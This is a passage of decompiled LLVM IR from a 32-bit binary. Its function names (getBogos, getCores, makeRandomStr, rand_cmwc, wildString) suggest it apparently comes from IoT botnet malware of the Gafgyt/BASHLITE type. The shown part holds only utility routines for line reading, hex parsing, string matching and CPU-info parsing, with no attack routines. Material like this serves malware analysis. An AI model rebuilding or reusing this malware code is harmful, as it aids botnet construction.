  %v2_8048c4e = add i32 %v0_8048c49, %v2_8048bb9
  %v1_8048c51 = inttoptr i32 %v2_8048c4e to i32*
  %v2_8048c51 = load i32, i32* %v1_8048c51, align 4
  store i32 %v2_8048c5b, i32* @eax, align 4
  %v3_8048c65 = call i32 @__waitpid(i32 %v2_8048c51, i32 %v2_8048c5b, i32 0)
  %v13_8048c6d = icmp eq i32 %v3_8048c65, -1
  %v1_8048c71 = icmp eq i1 %v13_8048c6d, false
  br i1 %v1_8048c71, label %dec_label_pc_8048c7f, label %dec_label_pc_8048c73

dec_label_pc_8048c73:                             ; preds = %dec_label_pc_8048c41
  %v1_8048c73 = call i32 @__GI___errno_location(i32 %v3_8048c65)
  %v1_8048c78 = inttoptr i32 %v1_8048c73 to i32*
  %v2_8048c78 = load i32, i32* %v1_8048c78, align 4
  %v9_8048c7a = icmp eq i32 %v2_8048c78, 4
  br i1 %v9_8048c7a, label %dec_label_pc_8048c41, label %dec_label_pc_8048c7f

dec_label_pc_8048c7f:                             ; preds = %dec_label_pc_8048c73, %dec_label_pc_8048c41
  %v13_8048c6d.lcssa = phi i1 [ true, %dec_label_pc_8048c73 ], [ false, %dec_label_pc_8048c41 ]
  %v3_8048c95 = bitcast i32* %stack_var_-16 to %_TYPEDEF_sigset_t*
  %v4_8048c95 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8048c95, i32 0)
  %v2_8048c9d = mul i32 %tmp6, 4
  %v0_8048ca2 = load i32, i32* @global_var_8075b60.23, align 32
  %v2_8048ca7 = add i32 %v0_8048ca2, %v2_8048c9d
  %v1_8048caa = inttoptr i32 %v2_8048ca7 to i32*
  store i32 0, i32* %v1_8048caa, align 4
  br i1 %v13_8048c6d.lcssa, label %dec_label_pc_8048cd5, label %dec_label_pc_8048cb6

dec_label_pc_8048cb6:                             ; preds = %dec_label_pc_8048c7f
  %v3_8048cb6 = load i32, i32* %stack_var_-28, align 4
  %v1_8048cbf = and i32 %v3_8048cb6, 65280
  %v2_8048cc61 = udiv i32 %v1_8048cbf, 256
  br label %dec_label_pc_8048cd5

dec_label_pc_8048cd5:                             ; preds = %dec_label_pc_8048c7f, %dec_label_pc_8048cb6
  %storemerge2 = phi i32 [ %v2_8048cc61, %dec_label_pc_8048cb6 ], [ -1, %dec_label_pc_8048c7f ]
  %v2_8048cde.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048cdb

dec_label_pc_8048cdb:                             ; preds = %entry, %dec_label_pc_8048bb6, %dec_label_pc_8048cd5
  %v2_8048cde = phi i32 [ %v2_8048cde.pre, %dec_label_pc_8048cd5 ], [ %v0_8048ba7, %dec_label_pc_8048bb6 ], [ %v0_8048ba7, %entry ]
  %storemerge = phi i32 [ %storemerge2, %dec_label_pc_8048cd5 ], [ -1, %dec_label_pc_8048bb6 ], [ -1, %entry ]
  store i32 %v2_8048cde, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_8048c65, { 1, 0 }
  uselistorder i32 %v2_8048bb9, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048cdb, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048cd5, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  br label %dec_label_pc_8048d20

dec_label_pc_8048cf6:                             ; preds = %dec_label_pc_8048d28
  store i32 %arg3, i32* @eax, align 4
  %v3_8048d0e = call i32 @__libc_read(i32 %arg3, i32 %v5_8048d2b, i32 1)
  %v4_8048d16 = add nuw i32 %storemerge113, 1
  %v8_8048d1a = icmp eq i32 %v3_8048d0e, 0
  %v12_8048d1a = icmp eq i32 %v3_8048d0e, 1
  %v1_8048d1e = icmp eq i1 %v12_8048d1a, false
  br i1 %v1_8048d1e, label %dec_label_pc_8048d38, label %dec_label_pc_8048d20

dec_label_pc_8048d20:                             ; preds = %entry, %dec_label_pc_8048cf6
  %v8_8048d1a14 = phi i1 [ false, %entry ], [ %v8_8048d1a, %dec_label_pc_8048cf6 ]
  %storemerge113 = phi i32 [ 0, %entry ], [ %v4_8048d16, %dec_label_pc_8048cf6 ]
  %v5_8048d26 = icmp slt i32 %storemerge113, %arg2
  br i1 %v5_8048d26, label %dec_label_pc_8048d28, label %dec_label_pc_8048d38

dec_label_pc_8048d28:                             ; preds = %dec_label_pc_8048d20
  %v5_8048d2b = add i32 %storemerge113, %arg1
  %v1_8048d2e = add i32 %v5_8048d2b, -1
  %v1_8048d31 = inttoptr i32 %v1_8048d2e to i8*
  %v2_8048d31 = load i8, i8* %v1_8048d31, align 1
  %v10_8048d34 = icmp eq i8 %v2_8048d31, 10
  %v1_8048d36 = icmp eq i1 %v10_8048d34, false
  br i1 %v1_8048d36, label %dec_label_pc_8048cf6, label %dec_label_pc_8048d38

dec_label_pc_8048d38:                             ; preds = %dec_label_pc_8048d20, %dec_label_pc_8048d28, %dec_label_pc_8048cf6
  %v8_8048d1a.lcssa = phi i1 [ %v8_8048d1a14, %dec_label_pc_8048d20 ], [ %v8_8048d1a14, %dec_label_pc_8048d28 ], [ %v8_8048d1a, %dec_label_pc_8048cf6 ]
  br i1 %v8_8048d1a.lcssa, label %dec_label_pc_8048d4d, label %dec_label_pc_8048d3e

dec_label_pc_8048d3e:                             ; preds = %dec_label_pc_8048d38
  br label %dec_label_pc_8048d4d

dec_label_pc_8048d4d:                             ; preds = %dec_label_pc_8048d38, %dec_label_pc_8048d3e
  %storemerge = phi i32 [ %arg1, %dec_label_pc_8048d3e ], [ 0, %dec_label_pc_8048d38 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v5_8048d2b, { 1, 0 }
  uselistorder i32 %storemerge113, { 2, 0, 1 }
  uselistorder i1 %v8_8048d1a14, { 1, 0 }
  uselistorder i1 %v8_8048d1a, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048d4d, { 1, 0 }
  uselistorder label %dec_label_pc_8048d38, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048d20, { 1, 0 }
}

define i32 @parseHex(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8048d821 = ptrtoint i8* %arg1 to i32
  %v2_8048d852 = load i8, i8* %arg1, align 1
  %v4_8048d884 = icmp eq i8 %v2_8048d852, 0
  br i1 %v4_8048d884, label %dec_label_pc_8048d92, label %dec_label_pc_8048d8c

dec_label_pc_8048d61:                             ; preds = %dec_label_pc_8048d8c
  %v2_8048d66 = mul i32 %stack_var_-8.010, 16
  %v2_8048d6c = load i8, i8* %stack_var_4.011, align 1
  %v3_8048d6c = zext i8 %v2_8048d6c to i32
  %v1_8048d72 = mul nuw nsw i32 %v3_8048d6c, 4
  %v2_8048d72 = add i32 %v1_8048d72, ptrtoint (i32* @global_var_80685c0.27 to i32)
  %v3_8048d72 = inttoptr i32 %v2_8048d72 to i32*
  %v4_8048d72 = load i32, i32* %v3_8048d72, align 4
  %v2_8048d79 = or i32 %v4_8048d72, %v2_8048d66
  %v5_8048d7e = add i32 %v4_8048d8212, 1
  %v23_8048d7e = inttoptr i32 %v5_8048d7e to i8*
  %v2_8048d85 = load i8, i8* %v23_8048d7e, align 1
  %v4_8048d88 = icmp eq i8 %v2_8048d85, 0
  br i1 %v4_8048d88, label %dec_label_pc_8048d92, label %dec_label_pc_8048d8c

dec_label_pc_8048d8c:                             ; preds = %entry, %dec_label_pc_8048d61
  %v4_8048d8212 = phi i32 [ %v5_8048d7e, %dec_label_pc_8048d61 ], [ %v4_8048d821, %entry ]
  %stack_var_4.011 = phi i8* [ %v23_8048d7e, %dec_label_pc_8048d61 ], [ %arg1, %entry ]
  %stack_var_-8.010 = phi i32 [ %v2_8048d79, %dec_label_pc_8048d61 ], [ 0, %entry ]
  %v5_8048d8c = icmp slt i32 %stack_var_-8.010, 0
  %v1_8048d90 = icmp eq i1 %v5_8048d8c, false
  br i1 %v1_8048d90, label %dec_label_pc_8048d61, label %dec_label_pc_8048d92

dec_label_pc_8048d92:                             ; preds = %dec_label_pc_8048d61, %dec_label_pc_8048d8c, %entry
  %stack_var_-8.0.lcssa = phi i32 [ 0, %entry ], [ %v2_8048d79, %dec_label_pc_8048d61 ], [ %stack_var_-8.010, %dec_label_pc_8048d8c ]
  ret i32 %stack_var_-8.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-8.010, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8048d92, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048d8c, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp13 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8048d9a = load i32, i32* @ebx, align 4
  store i32 %v0_8048d9a, i32* %stack_var_-8, align 4
  %v4_8048d9e = ptrtoint i8* %arg1 to i32
  %v2_8048da1 = load i8, i8* %arg1, align 1
  %v12_8048daa = icmp eq i8 %v2_8048da1, 42
  br i1 %v12_8048daa, label %dec_label_pc_8048dd2, label %dec_label_pc_8048db0

dec_label_pc_8048db0:                             ; preds = %entry
  %v12_8048db0 = icmp eq i8 %v2_8048da1, 63
  br i1 %v12_8048db0, label %dec_label_pc_8048e29, label %dec_label_pc_8048db6

dec_label_pc_8048db6:                             ; preds = %dec_label_pc_8048db0
  %v4_8048db6 = icmp eq i8 %v2_8048da1, 0
  br i1 %v4_8048db6, label %dec_label_pc_8048dc1, label %dec_label_pc_8048e67

dec_label_pc_8048dc1:                             ; preds = %dec_label_pc_8048db6
  %v2_8048dc4 = load i8, i8* %tmp13, align 1
  %v3_8048dc4 = zext i8 %v2_8048dc4 to i32
  br label %dec_label_pc_8048ec1

dec_label_pc_8048dd2:                             ; preds = %entry
  %v1_8048dd5 = add i32 %v4_8048d9e, 1
  %v4_8048ddf = inttoptr i32 %v1_8048dd5 to i8*
  %v5_8048de2 = call i32 @wildString(i8* %v4_8048ddf, i32 %arg2)
  %v1_8048de7 = icmp eq i32 %v5_8048de2, 0
  br i1 %v1_8048de7, label %dec_label_pc_8048e17, label %dec_label_pc_8048deb

dec_label_pc_8048deb:                             ; preds = %dec_label_pc_8048dd2
  %v2_8048dee = load i8, i8* %tmp13, align 1
  %v4_8048df1 = icmp eq i8 %v2_8048dee, 0
  br i1 %v4_8048df1, label %dec_label_pc_8048e1e, label %dec_label_pc_8048df5

dec_label_pc_8048df5:                             ; preds = %dec_label_pc_8048deb
  %v1_8048df8 = add i32 %arg2, 1
  %v5_8048e05 = call i32 @wildString(i8* nonnull %arg1, i32 %v1_8048df8)
  %v1_8048e0a = icmp eq i32 %v5_8048e05, 0
  br i1 %v1_8048e0a, label %dec_label_pc_8048e17, label %dec_label_pc_8048e1e

dec_label_pc_8048e17:                             ; preds = %dec_label_pc_8048df5, %dec_label_pc_8048dd2
  br label %dec_label_pc_8048e1e

dec_label_pc_8048e1e:                             ; preds = %dec_label_pc_8048deb, %dec_label_pc_8048df5, %dec_label_pc_8048e17
  %storemerge6 = phi i32 [ 0, %dec_label_pc_8048e17 ], [ 1, %dec_label_pc_8048df5 ], [ 1, %dec_label_pc_8048deb ]
  br label %dec_label_pc_8048ec1

dec_label_pc_8048e29:                             ; preds = %dec_label_pc_8048db0
  %v2_8048e2c = load i8, i8* %tmp13, align 1
  %v4_8048e2f = icmp eq i8 %v2_8048e2c, 0
  br i1 %v4_8048e2f, label %dec_label_pc_8048e5f, label %dec_label_pc_8048e33

dec_label_pc_8048e33:                             ; preds = %dec_label_pc_8048e29
  %v1_8048e36 = add i32 %arg2, 1
  %v1_8048e3c = add i32 %v4_8048d9e, 1
  %v4_8048e43 = inttoptr i32 %v1_8048e3c to i8*
  %v5_8048e46 = call i32 @wildString(i8* %v4_8048e43, i32 %v1_8048e36)
  %v1_8048e4b = icmp ne i32 %v5_8048e46, 0
  %. = zext i1 %v1_8048e4b to i32
  br label %dec_label_pc_8048e5f

dec_label_pc_8048e5f:                             ; preds = %dec_label_pc_8048e33, %dec_label_pc_8048e29
  %storemerge5 = phi i32 [ 1, %dec_label_pc_8048e29 ], [ %., %dec_label_pc_8048e33 ]
  br label %dec_label_pc_8048ec1

dec_label_pc_8048e67:                             ; preds = %dec_label_pc_8048db6
  %v2_8048e6a = load i8, i8* %arg1, align 1
  %v3_8048e6a = zext i8 %v2_8048e6a to i32
  %v2_8048e73 = call i32 @__GI_toupper(i32 %v3_8048e6a)
  store i32 %v2_8048e73, i32* @ebx, align 4
  %v2_8048e7d = load i8, i8* %tmp13, align 1
  %v3_8048e7d = zext i8 %v2_8048e7d to i32
  %v2_8048e86 = call i32 @__GI_toupper(i32 %v3_8048e7d)
  %v0_8048e8b = load i32, i32* @ebx, align 4
  %v12_8048e8b = icmp eq i32 %v0_8048e8b, %v2_8048e86
  %v1_8048e8d = icmp eq i1 %v12_8048e8b, false
  br i1 %v1_8048e8d, label %dec_label_pc_8048ebb, label %dec_label_pc_8048e8f

dec_label_pc_8048e8f:                             ; preds = %dec_label_pc_8048e67
  %v1_8048e92 = add i32 %arg2, 1
  %v1_8048e98 = add i32 %v4_8048d9e, 1
  %v4_8048e9f = inttoptr i32 %v1_8048e98 to i8*
  %v5_8048ea2 = call i32 @wildString(i8* %v4_8048e9f, i32 %v1_8048e92)
  %v1_8048ea7 = icmp ne i32 %v5_8048ea2, 0
  %.7 = zext i1 %v1_8048ea7 to i32
  br label %dec_label_pc_8048ebb

dec_label_pc_8048ebb:                             ; preds = %dec_label_pc_8048e8f, %dec_label_pc_8048e67
  %storemerge = phi i32 [ 1, %dec_label_pc_8048e67 ], [ %.7, %dec_label_pc_8048e8f ]
  br label %dec_label_pc_8048ec1

dec_label_pc_8048ec1:                             ; preds = %dec_label_pc_8048e5f, %dec_label_pc_8048e1e, %dec_label_pc_8048dc1, %dec_label_pc_8048ebb
  %stack_var_-24.0 = phi i32 [ %storemerge6, %dec_label_pc_8048e1e ], [ %storemerge5, %dec_label_pc_8048e5f ], [ %v3_8048dc4, %dec_label_pc_8048dc1 ], [ %storemerge, %dec_label_pc_8048ebb ]
  %v2_8048ec7 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048ec7, i32* @ebx, align 4
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i8 %v2_8048da1, { 2, 0, 1 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8048ec1, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8048e1e, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v0_8048eca = load i32, i32* @ebp, align 4
  %v1_8048ed6 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_8048ed6, i32* %arg2, align 4
  %v10_8048ee7 = icmp eq i32 %v1_8048ed6, -1
  %. = zext i1 %v10_8048ee7 to i32
  store i32 %v0_8048eca, i32* @ebp, align 4
  ret i32 %.
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048f01 = load i32, i32* @ebp, align 4
  store i32 %v0_8048f01, i32* %stack_var_-4, align 4
  %v4_8048f255 = ptrtoint i8* %arg1 to i32
  %v2_8048f286 = load i8, i8* %arg1, align 1
  %v4_8048f2b8 = icmp eq i8 %v2_8048f286, 0
  %v1_8048f2d10 = icmp eq i1 %v4_8048f2b8, false
  br i1 %v1_8048f2d10, label %dec_label_pc_8048f09, label %dec_label_pc_8048f2f

dec_label_pc_8048f09:                             ; preds = %entry, %dec_label_pc_8048f09
  %v4_8048f2512 = phi i32 [ %v5_8048f21, %dec_label_pc_8048f09 ], [ %v4_8048f255, %entry ]
  %stack_var_4.011 = phi i8* [ %v23_8048f21, %dec_label_pc_8048f09 ], [ %arg1, %entry ]
  %v2_8048f0c = load i8, i8* %stack_var_4.011, align 1
  %v3_8048f0c = zext i8 %v2_8048f0c to i32
  %v1_8048f15 = call i32 @__GI_toupper(i32 %v3_8048f0c)
  %sext = mul i32 %v1_8048f15, 16777216
  %v1_8048f1a = sdiv i32 %sext, 16777216
  %v1_8048f1f = trunc i32 %v1_8048f1a to i8
  store i8 %v1_8048f1f, i8* %stack_var_4.011, align 1
  %v5_8048f21 = add i32 %v4_8048f2512, 1
  %v23_8048f21 = inttoptr i32 %v5_8048f21 to i8*
  %v2_8048f28 = load i8, i8* %v23_8048f21, align 1
  %v4_8048f2b = icmp eq i8 %v2_8048f28, 0
  %v1_8048f2d = icmp eq i1 %v4_8048f2b, false
  br i1 %v1_8048f2d, label %dec_label_pc_8048f09, label %dec_label_pc_8048f25.dec_label_pc_8048f2f_crit_edge

dec_label_pc_8048f25.dec_label_pc_8048f2f_crit_edge: ; preds = %dec_label_pc_8048f09
  %v2_8048f2f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048f2f

dec_label_pc_8048f2f:                             ; preds = %dec_label_pc_8048f25.dec_label_pc_8048f2f_crit_edge, %entry
  %v2_8048f2f = phi i32 [ %v2_8048f2f.pre, %dec_label_pc_8048f25.dec_label_pc_8048f2f_crit_edge ], [ %v0_8048f01, %entry ]
  %v3_8048f28.lcssa.in = phi i8 [ %v2_8048f28, %dec_label_pc_8048f25.dec_label_pc_8048f2f_crit_edge ], [ %v2_8048f286, %entry ]
  %v3_8048f28.lcssa = zext i8 %v3_8048f28.lcssa.in to i32
  store i32 %v2_8048f2f, i32* @ebp, align 4
  ret i32 %v3_8048f28.lcssa

; uselistorder directives
  uselistorder i8* %v23_8048f21, { 1, 0 }
  uselistorder i32 %v5_8048f21, { 1, 0 }
  uselistorder i8* %stack_var_4.011, { 1, 0 }
  uselistorder label %dec_label_pc_8048f09, { 1, 0 }
}

define i32 @getBogos(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4104 = alloca i32, align 4
  %stack_var_-4112 = alloca i32, align 4
  %v4_8048f4a = call i32 @__libc_open(i32 ptrtoint ([14 x i8]* @global_var_80689c0.28 to i32), i32 0)
  %v2_804907e = ptrtoint i32* %stack_var_-4112 to i32
  %tmp19 = bitcast i32* %stack_var_-4112 to i8*
  %v5_804909621 = call i32 @fdgets(i32 %v2_804907e, i32 4096, i32 %v4_8048f4a)
  %v1_804909b22 = icmp eq i32 %v5_804909621, 0
  %v1_804909d24 = icmp eq i1 %v1_804909b22, false
  br i1 %v1_804909d24, label %dec_label_pc_8048f57, label %dec_label_pc_80490a3

dec_label_pc_8048f57:                             ; preds = %entry, %dec_label_pc_8049060
  %v3_8048f60 = call i32 @uppercase(i8* %tmp19)
  store i32 %v2_804907e, i32* @eax, align 4
  %v5_8048f76 = call i32 @strstr(i32 %v2_804907e, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80689ce.29, i32 0, i32 0))
  %v12_8048f83 = icmp eq i32 %v5_8048f76, %v2_804907e
  %v1_8048f85 = icmp eq i1 %v12_8048f83, false
  br i1 %v1_8048f85, label %dec_label_pc_8049060, label %dec_label_pc_8048f8b

dec_label_pc_8048f8b:                             ; preds = %dec_label_pc_8048f57
  %tmp20 = bitcast i32* %stack_var_-4104 to i8*
  br label %dec_label_pc_8048f9d

dec_label_pc_8048f99:                             ; preds = %dec_label_pc_8048fb1, %dec_label_pc_8048fa7, %dec_label_pc_8048f9d
  %v5_8048f99 = add i32 %v4_8048f9d, 1
  %v23_8048f99 = inttoptr i32 %v5_8048f99 to i8*
  br label %dec_label_pc_8048f9d

dec_label_pc_8048f9d:                             ; preds = %dec_label_pc_8048f8b, %dec_label_pc_8048f99
  %storemerge4 = phi i8* [ %v23_8048f99, %dec_label_pc_8048f99 ], [ %tmp20, %dec_label_pc_8048f8b ]
  %v4_8048f9d = ptrtoint i8* %storemerge4 to i32
  %v2_8048fa0 = load i8, i8* %storemerge4, align 1
  %v7_8048fa3 = icmp eq i8 %v2_8048fa0, 32
  br i1 %v7_8048fa3, label %dec_label_pc_8048f99, label %dec_label_pc_8048fa7

dec_label_pc_8048fa7:                             ; preds = %dec_label_pc_8048f9d
  %v2_8048faa = load i8, i8* %storemerge4, align 1
  %v10_8048fad = icmp eq i8 %v2_8048faa, 9
  br i1 %v10_8048fad, label %dec_label_pc_8048f99, label %dec_label_pc_8048fb1

dec_label_pc_8048fb1:                             ; preds = %dec_label_pc_8048fa7
  %v2_8048fb4 = load i8, i8* %storemerge4, align 1
  %v10_8048fb7 = icmp eq i8 %v2_8048fb4, 58
  br i1 %v10_8048fb7, label %dec_label_pc_8048f99, label %dec_label_pc_8048fd4.preheader

dec_label_pc_8048fd4.preheader:                   ; preds = %dec_label_pc_8048fb1
  %v1_8048fd7 = add i32 %v4_8048f9d, -1
  br label %dec_label_pc_8048fd4

dec_label_pc_8048fbd:                             ; preds = %dec_label_pc_8048fef, %dec_label_pc_8048fd4
  %v3_8048fc9 = call i32 @strlen(i8* %storemerge4)
  %v2_8048fce = add i32 %v1_8048fd7, %v3_8048fc9
  %v1_8048fd1 = inttoptr i32 %v2_8048fce to i8*
  store i8 0, i8* %v1_8048fd1, align 1
  br label %dec_label_pc_8048fd4

dec_label_pc_8048fd4:                             ; preds = %dec_label_pc_8048fd4.preheader, %dec_label_pc_8048fbd
  %v3_8048fe0 = call i32 @strlen(i8* %storemerge4)
  %v2_8048fe5 = add i32 %v1_8048fd7, %v3_8048fe0
  %v1_8048fe8 = inttoptr i32 %v2_8048fe5 to i8*
  %v2_8048fe8 = load i8, i8* %v1_8048fe8, align 1
  %v10_8048feb = icmp eq i8 %v2_8048fe8, 13
  br i1 %v10_8048feb, label %dec_label_pc_8048fbd, label %dec_label_pc_8048fef

dec_label_pc_8048fef:                             ; preds = %dec_label_pc_8048fd4
  %v3_8048ffb = call i32 @strlen(i8* %storemerge4)
  %v2_8049000 = add i32 %v1_8048fd7, %v3_8048ffb
  %v1_8049003 = inttoptr i32 %v2_8049000 to i8*
  %v2_8049003 = load i8, i8* %v1_8049003, align 1
  %v10_8049006 = icmp eq i8 %v2_8049003, 10
  br i1 %v10_8049006, label %dec_label_pc_8048fbd, label %dec_label_pc_804900a

dec_label_pc_804900a:                             ; preds = %dec_label_pc_8048fef
  %v5_8049018 = call i32 @__GI_strchr(i8* %storemerge4, i32 46)
  %v1_804901d = icmp eq i32 %v5_8049018, 0
  br i1 %v1_804901d, label %dec_label_pc_8049037, label %dec_label_pc_8049021

dec_label_pc_8049021:                             ; preds = %dec_label_pc_804900a
  %v5_804902f = call i32 @__GI_strchr(i8* %storemerge4, i32 46)
  %v6_804902f = inttoptr i32 %v5_804902f to i8*
  store i8 0, i8* %v6_804902f, align 1
  br label %dec_label_pc_8049037

dec_label_pc_8049037:                             ; preds = %dec_label_pc_804900a, %dec_label_pc_8049021
  store i32 %v4_8048f9d, i32* @eax, align 4
  %v4_8049041 = inttoptr i32 %arg1 to i8*
  %v5_8049044 = call i32 @strcpy(i8* %v4_8049041, i32 %v4_8048f9d)
  store i32 %v4_8048f4a, i32* @eax, align 4
  %v2_804904f = call i32 @__GI___libc_close(i32 %v4_8048f4a)
  br label %dec_label_pc_80490b8

dec_label_pc_8049060:                             ; preds = %dec_label_pc_8048f57
  %v6_8049079 = call i32 @__GI_memset(i8* %tmp19, i32 0, i32 4096)
  %v5_8049096 = call i32 @fdgets(i32 %v2_804907e, i32 4096, i32 %v4_8048f4a)
  %v1_804909b = icmp eq i32 %v5_8049096, 0
  %v1_804909d = icmp eq i1 %v1_804909b, false
  br i1 %v1_804909d, label %dec_label_pc_8048f57, label %dec_label_pc_80490a3

dec_label_pc_80490a3:                             ; preds = %dec_label_pc_8049060, %entry
  store i32 %v4_8048f4a, i32* @eax, align 4
  %v2_80490a9 = call i32 @__GI___libc_close(i32 %v4_8048f4a)
  br label %dec_label_pc_80490b8

dec_label_pc_80490b8:                             ; preds = %dec_label_pc_8049037, %dec_label_pc_80490a3
  %storemerge = phi i32 [ 1, %dec_label_pc_80490a3 ], [ 0, %dec_label_pc_8049037 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8048fd7, { 1, 2, 0 }
  uselistorder i32 %v4_8048f9d, { 1, 0, 2, 3 }
  uselistorder i8* %storemerge4, { 0, 1, 2, 4, 3, 5, 6, 8, 7 }
  uselistorder i32 %v2_804907e, { 4, 0, 2, 3, 1 }
  uselistorder i32 %v4_8048f4a, { 2, 1, 5, 4, 3, 0 }
  uselistorder label %dec_label_pc_80490b8, { 1, 0 }
  uselistorder label %dec_label_pc_8049037, { 1, 0 }
  uselistorder label %dec_label_pc_8048fd4, { 1, 0 }
  uselistorder label %dec_label_pc_8048f9d, { 1, 0 }
  uselistorder label %dec_label_pc_8048f57, { 1, 0 }
}

define i32 @getCores() local_unnamed_addr {
entry:
  %stack_var_-4108 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80490c7 = load i32, i32* @ebp, align 4
  store i32 %v0_80490c7, i32* %stack_var_-4, align 4
  %v4_80490c7 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80490c7, i32* @ebp, align 4
  %v4_80490e6 = call i32 @__libc_open(i32 ptrtoint ([14 x i8]* @global_var_80689c0.28 to i32), i32 0)
  %v2_8049142 = ptrtoint i32* %stack_var_-4108 to i32
  %tmp10 = bitcast i32* %stack_var_-4108 to i8*
  %v5_804915a11 = call i32 @fdgets(i32 %v2_8049142, i32 4096, i32 %v4_80490e6)
  %v1_804915f12 = icmp eq i32 %v5_804915a11, 0
  %v1_804916114 = icmp eq i1 %v1_804915f12, false
  br i1 %v1_804916114, label %dec_label_pc_80490f0, label %dec_label_pc_8049163

dec_label_pc_80490f0:                             ; preds = %entry, %dec_label_pc_8049124
  %stack_var_-12.115 = phi i32 [ %stack_var_-12.0, %dec_label_pc_8049124 ], [ 0, %entry ]
  %v3_80490f9 = call i32 @uppercase(i8* %tmp10)
  store i32 %v2_8049142, i32* @eax, align 4
  %v5_804910f = call i32 @strstr(i32 %v2_8049142, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80689ce.29, i32 0, i32 0))
  %v12_804911c = icmp eq i32 %v5_804910f, %v2_8049142
  %v1_804911e = icmp eq i1 %v12_804911c, false
  br i1 %v1_804911e, label %dec_label_pc_8049124, label %dec_label_pc_8049120

dec_label_pc_8049120:                             ; preds = %dec_label_pc_80490f0
  %v4_8049120 = add i32 %stack_var_-12.115, 1
  br label %dec_label_pc_8049124

dec_label_pc_8049124:                             ; preds = %dec_label_pc_80490f0, %dec_label_pc_8049120
  %stack_var_-12.0 = phi i32 [ %stack_var_-12.115, %dec_label_pc_80490f0 ], [ %v4_8049120, %dec_label_pc_8049120 ]
  %v6_804913d = call i32 @__GI_memset(i8* %tmp10, i32 0, i32 4096)
  %v5_804915a = call i32 @fdgets(i32 %v2_8049142, i32 4096, i32 %v4_80490e6)
  %v1_804915f = icmp eq i32 %v5_804915a, 0
  %v1_8049161 = icmp eq i1 %v1_804915f, false
  br i1 %v1_8049161, label %dec_label_pc_80490f0, label %dec_label_pc_8049163

dec_label_pc_8049163:                             ; preds = %dec_label_pc_8049124, %entry
  %stack_var_-12.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-12.0, %dec_label_pc_8049124 ]
  store i32 %v4_80490e6, i32* @eax, align 4
  %v2_8049169 = call i32 @__GI___libc_close(i32 %v4_80490e6)
  ret i32 %stack_var_-12.1.lcssa

; uselistorder directives
  uselistorder i32 %v2_8049142, { 4, 0, 2, 3, 1 }
  uselistorder i32 %v4_80490e6, { 2, 1, 3, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_8049124, { 1, 0 }
  uselistorder label %dec_label_pc_80490f0, { 1, 0 }
}

define i32 @makeRandomStr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049173 = load i32, i32* @ebp, align 4
  store i32 %v0_8049173, i32* %stack_var_-4, align 4
  %v0_8049176 = load i32, i32* @ebx, align 4
  store i32 %v0_8049176, i32* %stack_var_-8, align 4
  %v5_804918f = ptrtoint i8* %arg1 to i32
  %v5_80491cb19 = icmp sgt i32 %arg2, 0
  br i1 %v5_80491cb19, label %dec_label_pc_804918a, label %dec_label_pc_80491cd

dec_label_pc_804918a:                             ; preds = %entry, %dec_label_pc_804918a
  %storemerge20 = phi i32 [ %v4_80491c1, %dec_label_pc_804918a ], [ 0, %entry ]
  %v6_804918f = add i32 %storemerge20, %v5_804918f
  store i32 %v6_804918f, i32* @ebx, align 4
  %v1_8049192 = call i32 @rand_cmwc(i32 %storemerge20)
  %v2_80491a3 = zext i32 %v1_8049192 to i64
  %v4_80491a3 = mul nuw nsw i64 %v2_80491a3, 1321528399
  %v2_80491a72 = udiv i64 %v4_80491a3, 34359738368
  %v7_80491ad = mul nuw nsw i64 %v2_80491a72, 26
  %v8_80491ad = trunc i64 %v7_80491ad to i32
  %v2_80491b3 = sub i32 %v1_8049192, %v8_80491ad
  %v1_80491bc = add i32 %v2_80491b3, 65
  %v11_80491bc = trunc i32 %v1_80491bc to i8
  %v2_80491bf = load i32, i32* @ebx, align 4
  %v3_80491bf = inttoptr i32 %v2_80491bf to i8*
  store i8 %v11_80491bc, i8* %v3_80491bf, align 1
  %v4_80491c1 = add nuw nsw i32 %storemerge20, 1
  %exitcond = icmp eq i32 %v4_80491c1, %arg2
